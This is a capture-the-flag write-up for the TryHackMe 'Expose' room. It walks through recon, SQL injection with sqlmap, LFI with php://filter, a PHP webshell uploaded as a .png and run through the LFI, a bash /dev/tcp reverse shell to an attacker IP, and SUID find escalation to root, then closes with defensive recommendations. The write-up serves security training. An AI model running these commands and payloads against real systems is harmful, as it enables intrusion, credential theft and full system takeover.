# Expose — TryHackMe Writeup

- **Room theme:** Web exploitation chain (SQL Injection → LFI → Insecure File Upload → SUID Privilege Escalation)
- **Target:** `10.49.176.101` (also referenced as `10.49.182.94` / `10.49.158.22` across session restarts)
- **Category:** Web Exploitation / Privilege Escalation
- **Difficulty:** Medium

## TL;DR

A multi-stage box built around a fake "Admin Portal" and a hidden "real" admin login. The email field of the login form was vulnerable to SQL injection, which was used to dump database credentials — including two hidden, obscure URLs stored directly inside the `phpmyadmin` database. Those URLs led to a Local File Inclusion (LFI) vulnerability that was used to read `/etc/passwd`, enumerate a system user, and pull the source code of a password-gated upload page. That page had a client-side-only file extension check, allowing a PHP webshell to be uploaded disguised as a `.png`. The LFI was then used a second time to include and execute the uploaded webshell, granting command execution. From there, a plaintext SSH credentials file was read directly off disk, and a misconfigured SUID binary (`find`) was used to escalate to a root shell.

---

## Recon

```bash
nmap 10.49.176.101
nmap -p- 10.49.176.101
nmap -sV -p21,22,53,1337,1883 10.49.176.101
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21   | FTP | vsftpd 2.0.8+ | Anonymous login allowed, but empty/non-writable directory — dead end |
| 22   | SSH | OpenSSH 8.2p1 (Ubuntu) | Final target — used after webshell credential leak |
| 53   | DNS | ISC BIND 9.16.1 | Not exploited |
| 1337 | HTTP | Apache 2.4.41 (Ubuntu) | Main attack surface — the "Web Challenge" |
| 1883 | MQTT | Mosquitto 1.6.9 | Explored via `$SYS/#`, but not part of the final exploit chain |

**FTP banner** identified the challenge explicitly: `220 Welcome to the Expose Web Challenge`, confirming port 1337 was the intended focus.

**Nikto** against port 1337 flagged an interesting path: `/admin/index.php`, along with an exposed `phpmyadmin` install (`/phpmyadmin/changelog.php`).

**whatweb** confirmed two panels:
- `/phpmyadmin/index.php` — standard phpMyAdmin login
- `/admin/` — a custom "Admin Portal" (Bootstrap + jQuery), flagged as `200 OK`

---

## Level 1 — Anonymous FTP (Dead End) & MQTT Exploration (Side Path)

**FTP:** Logged in as `anonymous` with a blank password. Directory listing (`ls -la`) showed only `.` and `..` — no files. Confirmed the directory was **not writable** (`put` returned `550 Permission denied`). This was a red herring / minor confirmation step rather than a real foothold.

**MQTT:** Since Mosquitto was exposed on 1883, tried a wildcard subscribe:
```bash
mosquitto_sub -h 10.49.176.101 -t '#' -v
```
This returned nothing, despite the broker clearly being active. Switching to the reserved system topic namespace worked:
```bash
mosquitto_sub -h 10.49.176.101 -t '$SYS/#' -v
```
This confirmed the broker had **retained messages** (up to 38) and active publish/subscribe traffic, but the ACL was blocking wildcard subscriptions on real application topics for anonymous clients — only `$SYS/#` (broker stats) was accessible. No topic names were ever recovered, and this path was abandoned in favor of the web application, which turned out to be the actual intended route.

**Lesson:** `$SYS/#` is often accessible on Mosquitto even when real topics are ACL-restricted, since it's broker metadata rather than application data — useful for confirming a broker is "alive" and has retained data, even when you can't reach the data itself.

---

## Level 2 — Finding the Real Admin Portal

**The decoy:** `/admin/` rendered a login form with **no functional "Continue" button** in the page source — just static HTML with no JavaScript wiring the button to any request. A clear indicator this was a fake/distraction panel.

**Directory brute-force** with a larger wordlist surfaced a second, near-identical path:
```bash
ffuf -u http://10.49.176.101:1337/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 200
```
Results included both `admin` (301) and **`admin_101`** (301) — a naming pattern easy to miss without a comprehensive wordlist.

**The real portal** (`/admin_101/`) differed in two important ways:
1. The username field was **pre-filled**: `hacker@root.thm`
2. The page included working JavaScript that POSTed credentials via AJAX to `includes/user_login.php`, and redirected to `chat.php` on success:
```javascript
$('#login').on('click', function(){
    $.ajax({
        url: 'includes/user_login.php',
        method: 'POST',
        data: {
            'email': $('input[name="email"]').val(),
            'password': $('input[name="password"]').val(),
        },
        success(data) {
            if (data.status == 'success') location.href = 'chat.php';
            else alert(data.status);
        }
    });
});
```

**Lesson:** A room (or real-world app) can plant a visually identical decoy panel with subtly broken functionality (a dead button) specifically to waste attacker time — always verify that interactive elements are actually wired up before investing effort in a login form.

---

## Level 3 — SQL Injection in the Login Form

Submitting a wrong password against the real portal returned a **verbose SQL error** directly in the JSON response:
```json
{
  "status": "error",
  "messages": [
    "SELECT * FROM user WHERE email = 'hacker@root.thm'"
  ]
}
```
This confirmed:
- The `email` parameter is concatenated directly into the query (classic SQL injection)
- Verbose error messages are enabled, leaking query structure — a significant misconfiguration on its own

**Automated exploitation with sqlmap:**
```bash
sqlmap -u "http://10.49.176.101:1337/admin_101/includes/user_login.php" \
  --data="email=hacker@root.thm&password=test" --method=POST
```
sqlmap identified three separate injection techniques on the `email` parameter:
- **Boolean-based blind** (`EXTRACTVALUE` in a `CASE WHEN`)
- **Error-based** (`EXTRACTVALUE` + `CONCAT`)
- **Time-based blind** (`SLEEP(5)`)

Back-end confirmed as **MySQL**, running on Ubuntu (Apache 2.4.41).

**Database enumeration:**
```bash
sqlmap -u "..." --data="email=hacker@root.thm&password=test" --method=POST --dbs
```
```
available databases [6]:
[*] expose
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] sys
```

**Dumping `expose.user`:**
```bash
sqlmap -u "..." --data="..." --method=POST -D expose -T user --dump
```
```
+----+-----------------+---------------------+---------------------------------------+
| id | email           | created             | password                               |
+----+-----------------+---------------------+---------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231   |
+----+-----------------+---------------------+---------------------------------------+
```

**Lesson:** Verbose SQL error messages are a direct roadmap for exploitation — they don't just confirm injectability, they hand over the exact query syntax needed to build a working payload without blind guesswork.

---

## Level 4 — Dumping phpMyAdmin's Own Config Database

Since `phpmyadmin` appeared in the database list, it was dumped too — a step easy to overlook when `expose` already yielded a working login.

```bash
sqlmap -u "..." --data="email=hacker@root.thm&password=VeryDifficultPassword123" \
  --method=POST -D phpmyadmin -T pma__users --dump
```
`pma__users` was empty, but a **`config`** table in the same database contained the real prize:

```
+----+-------------------------------+--------------------------------------------------------+
| id | url                           | password                                                |
+----+-------------------------------+----------------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)           |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z     |
+----+-------------------------------+----------------------------------------------------------+
```

Two obscure, unlinked URLs — neither discoverable via directory brute-forcing, since they weren't in any wordlist and weren't linked anywhere on the site. This is a deliberate design choice by the room: **the SQLi's real value wasn't the login bypass, it was discovering hidden endpoints stored as data.**

**Lesson:** A database dump isn't just for credentials — application config tables can contain hidden route names, feature flags, or debug endpoints never exposed through normal navigation or brute-forcing.

---

## Level 5 — Local File Inclusion (LFI)

Visiting `/file1010111/index.php` directly rendered a "Tourism Website" template with an explicit challenge hint embedded in a hidden `<span>`:
```html
<p>Parameter Fuzzing is also important :) or Can you hide DOM elements?</p>
<span style="display:none;">Hint: Try file or view as GET parameters?</span>
```

Testing the `file` parameter confirmed classic LFI:
```
http://10.49.176.101:1337/file1010111/index.php?file=/etc/passwd
```
This returned the full contents of `/etc/passwd`, from which a non-default, human-named account stood out among the system accounts:
```
zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash
```
This matched the phpMyAdmin config hint: *"ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z."*

**Reading PHP source via the LFI**, since directly including a `.php` file would execute rather than display it, the `php://filter` wrapper was used to base64-encode the source before inclusion:
```bash
curl -X POST "http://10.49.176.101:1337/file1010111/index.php?file=php://filter/convert.base64-encode/resource=../upload-cv00101011/index.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "password=easytohack"
```
Decoding the base64 output revealed the full PHP source of the upload panel, including:
- A session-gated password check (`$_SESSION['validate_file']`) requiring password `zeamkish`
- Zero server-side extension/type validation on the uploaded file — only client-side JavaScript enforced `.jpg`/`.png`
- Uploads stored under `upload_thm_1001/`, using the original filename (`basename($_FILES["file"]["name"])`)

**Lesson:** `php://filter/convert.base64-encode` is essential for LFI against `.php` files — without it, the PHP interpreter executes the included file instead of returning readable source, silently hiding the vulnerability's full value.

---

## Level 6 — Insecure File Upload → Remote Code Execution

With the password `zeamkish` (matching the earlier `/etc/passwd` username), the upload gate was passed. The client-side JavaScript check only validated the file extension in the browser — trivially bypassed by uploading a PHP webshell renamed with a `.png` extension via `curl` or Burp, since **no server-side validation existed at all** (confirmed by reading the source in Level 5).

A PHP webshell (`webshell.png`) was uploaded to `upload-cv00101011/index.php`, landing in `upload_thm_1001/`.

**Executing the webshell via the LFI** (chaining both vulnerabilities together): since the uploaded file was `.png` but contained PHP code, and the LFI on `/file1010111/index.php` would `include()` any local file regardless of extension, requesting it through the LFI parameter caused the PHP to execute:
```bash
curl -X POST "http://10.49.176.101:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/webshell.png&cmd=cat+/home/zeamkish/ssh_creds.txt" \
  -d "password=easytohack"
```
This returned:
```
SSH CREDS
zeamkish
easytohack@123
```

**Lesson:** LFI + unrestricted file upload is a classic RCE combo — LFI alone is often "read-only," but paired with an upload point that has no server-side extension/content validation, the LFI's `include()` will happily execute attacker-controlled PHP regardless of its file extension.

---

## Level 6b — Upgrading to a Reverse Shell

While the `cmd=` webshell (Level 6) and the leaked SSH credentials were both sufficient to reach the box, a reverse shell was set up as well for a more stable, interactive session (and as good practice for scenarios where SSH access isn't available).

**Listener on the attacking machine:**
```bash
nc -nvlp 4444
```

**First attempt — payload in the URL query string — failed:**
```bash
curl -X POST "http://10.49.158.22:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/webshell.png&cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.134.10/4444+0%3E%261%27" \
  -d "password=easytohack"
```
This returned:
```
414 Request-URI Too Long
```
The encoded reverse shell one-liner pushed the query string length past the server's limit.

**Fix — move the `cmd` parameter into the POST body instead of the URL**, since the webshell accepted it via `$_REQUEST` (both GET and POST):
```bash
curl -X POST "http://10.49.158.22:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/webshell.png" \
  --data-urlencode "password=easytohack" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.134.10/4444 0>&1'"
```
This kept the URL short (only the `file` parameter remains in the query string) while letting `curl --data-urlencode` handle safe encoding of the much longer reverse shell payload in the request body.

**Result:** Reverse shell connected successfully to the `nc` listener, giving an interactive shell as the web server user — a more usable foothold than repeated one-off `cmd=` requests, and set up before privilege escalation to `zeamkish`/root.

**Lesson:** Long payloads (especially reverse shell one-liners with heavy URL-encoding) can exceed a web server's default URI length limit (Apache's default is typically 8KB, but some configs are much stricter) when placed in the query string. Moving the same parameter into the POST body sidesteps this entirely, since body size limits are generally far more generous than URL length limits — a good default habit for any sizeable payload delivered through a vulnerable parameter.

---

## Level 7 — Privilege Escalation via SUID `find`

SSH'd in with the leaked credentials:
```bash
ssh zeamkish@10.49.176.101
# password: easytohack@123
```

Enumerated SUID binaries:
```bash
find / -type f -perm -u=s -ls 2>/dev/null
```
`find` itself was flagged as SUID-root — a well-known, catastrophic misconfiguration (SUID should almost never be set on `find`, since it has built-in command execution).

**Exploitation (GTFOBins technique):**
```bash
find . -exec /bin/bash -p \; -quit
```
The `-p` flag preserves the effective UID inherited from the SUID bit, dropping into a root-owned bash shell without dropping privileges.

**Result:** Full root access.

**Lesson:** SUID bits on binaries with built-in `-exec`, shell-out, or file-write capabilities (`find`, `vim`, `less`, `awk`, `cp`, etc.) are a direct privilege escalation path — always check [GTFOBins](https://gtfobins.github.io/) against every SUID binary found, since many common Unix utilities have a documented escalation technique.

---

## Full Command Reference

```bash
# Recon
nmap 10.49.176.101
nmap -p- 10.49.176.101
nmap -sV -p21,22,53,1337,1883 10.49.176.101
nikto -h http://10.49.176.101:1337/
whatweb http://10.49.176.101:1337/phpmyadmin/index.php
whatweb http://10.49.176.101:1337/admin

# Level 1 — FTP / MQTT (dead ends / side paths)
ftp 10.49.176.101          # anonymous / blank password
mosquitto_sub -h 10.49.176.101 -t '#' -v
mosquitto_sub -h 10.49.176.101 -t '$SYS/#' -v

# Level 2 — Finding the real admin portal
ffuf -u http://10.49.176.101:1337/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 200
# -> reveals /admin_101/

# Level 3 — SQL injection
sqlmap -u "http://10.49.176.101:1337/admin_101/includes/user_login.php" \
  --data="email=hacker@root.thm&password=test" --method=POST --dbs
sqlmap -u "..." --data="..." --method=POST -D expose -T user --dump

# Level 4 — phpMyAdmin config dump
sqlmap -u "..." --data="email=hacker@root.thm&password=VeryDifficultPassword123" \
  --method=POST -D phpmyadmin -T config --dump

# Level 5 — LFI
curl "http://10.49.176.101:1337/file1010111/index.php?file=/etc/passwd"
curl -X POST "http://10.49.176.101:1337/file1010111/index.php?file=php://filter/convert.base64-encode/resource=../upload-cv00101011/index.php" \
  -d "password=easytohack"

# Level 6 — Upload + RCE via LFI
# (upload webshell.png via browser/Burp to /upload-cv00101011/index.php with password 'zeamkish')
curl -X POST "http://10.49.176.101:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/webshell.png&cmd=cat+/home/zeamkish/ssh_creds.txt" \
  -d "password=easytohack"

# Level 6b — Reverse shell (payload moved to POST body to avoid 414 URI Too Long)
nc -nvlp 4444
curl -X POST "http://10.49.176.101:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/webshell.png" \
  --data-urlencode "password=easytohack" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"

# Level 7 — Privilege escalation
ssh zeamkish@10.49.176.101   # easytohack@123
find / -type f -perm -u=s -ls 2>/dev/null
find . -exec /bin/bash -p \; -quit
cat /root/root.txt
```

---

## Key Takeaways

1. **Decoy panels can be functionally broken on purpose.** The fake `/admin/` login had no working submit handler at all — always confirm interactivity before spending time on a login form.
2. **Verbose SQL errors are a gift to attackers.** Reflecting the raw query string in an error response turns blind exploitation into a guided one.
3. **Database dumps can hide more than credentials.** The `phpmyadmin.config` table stored obscure application URLs that were never linked or discoverable via brute-forcing — a reminder to always check *every* accessible database, not just the obviously named one.
4. **LFI against `.php` files needs a filter wrapper to be useful.** Without `php://filter/convert.base64-encode`, PHP source is executed rather than disclosed, hiding the full extent of what an LFI can reveal.
5. **Client-side file validation is not validation.** The upload form's JavaScript extension check was trivially bypassed with a raw HTTP request — server-side validation (MIME type, magic bytes, re-encoding) is the only validation that counts.
6. **LFI + unrestricted upload = RCE.** Neither vulnerability alone was catastrophic; combined, they allowed arbitrary PHP execution.
7. **Long payloads belong in the request body, not the URL.** A reverse shell one-liner triggered a `414 Request-URI Too Long` when passed as a GET query parameter; moving the same parameter into the POST body resolved it immediately, since body size limits are far more permissive than URL length limits.
8. **Plaintext credential files on disk are still a common real-world finding.** `ssh_creds.txt` sitting readable via a webshell is exactly the kind of "quick win" file real attackers search for after gaining any code execution.
9. **Always audit SUID binaries after gaining a foothold.** A SUID `find` is one of the most well-documented privilege escalation vectors in Linux — checking against GTFOBins should be a reflexive step after any low-privilege shell.

## Defensive Recommendations

- **Never reflect raw SQL (or any backend error detail) in application responses.** Log errors server-side; return generic messages to the client.
- **Use parameterized queries / prepared statements everywhere**, eliminating the SQL injection class of vulnerability entirely rather than relying on input sanitization.
- **Restrict database user permissions** so the web application's DB account cannot read unrelated databases (like `phpmyadmin`'s internal config) even if injection occurs.
- **Never construct file paths from user input without strict allow-listing.** LFI should be prevented by validating against a fixed set of permitted filenames/paths, not by blacklisting `../` sequences.
- **Validate file uploads server-side**, checking MIME type, magic bytes, and re-encoding images (e.g., via a resize operation) rather than trusting the client-supplied filename or extension.
- **Store uploaded files outside the webroot**, or in a location with PHP execution disabled (e.g., via `.htaccess` or web server config), so even a successfully uploaded webshell cannot be executed directly.
- **Never store plaintext credentials in files on disk**, even temporarily — use a secrets manager or environment-scoped variables with restrictive file permissions.
- **Audit SUID/SGID binaries regularly** and remove the bit from any utility not explicitly requiring it (`find`, `vim`, `awk`, etc. almost never need SUID).